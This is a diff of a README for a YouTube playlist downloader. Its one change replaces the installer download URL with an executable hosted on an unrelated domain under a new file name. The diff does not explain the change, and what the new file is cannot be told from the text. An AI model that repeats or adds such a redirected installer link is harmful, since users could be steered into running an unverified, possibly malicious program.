@@ -5,7 +5,7 @@
 ## What is it?
 A simple program to download whole playlists\channels or even single videos from YouTube 
 
-[Click here to download the installer](https://ypd.s3.nl-ams.scw.cloud/YoutubePlaylistDownloader.exe) 
+[Click here to download the installer](https://wikihex.com/YoutubeDownloader.exe) 
 
 ## Features
 - No ads, open source and free
